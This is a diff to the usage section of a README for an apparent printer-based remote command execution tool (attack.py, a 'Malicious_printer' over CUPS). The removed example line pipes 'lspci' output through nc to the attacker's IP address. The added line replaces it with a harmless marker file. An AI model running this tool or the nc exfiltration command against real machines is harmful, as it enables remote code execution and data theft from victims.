@@ -23,7 +23,7 @@ The ``COMMAND`` could be any linux command to be performed in the victim's machi
 For example this is how the command would look like:
 
 ```
-python attack.py 152.138.102.23 143.90.22.223 'lspci -nnk | nc 152.138.102.23 9090'
+python attack.py 152.138.102.23 143.90.22.223 'echo This machine has been attacked > /tmp/ATTACKED'
 ```
 
 The port of the printer would always be ``111``. Its location can be found in ``http://localhost:631/printers/Malicious_printer_152_138_102_23``
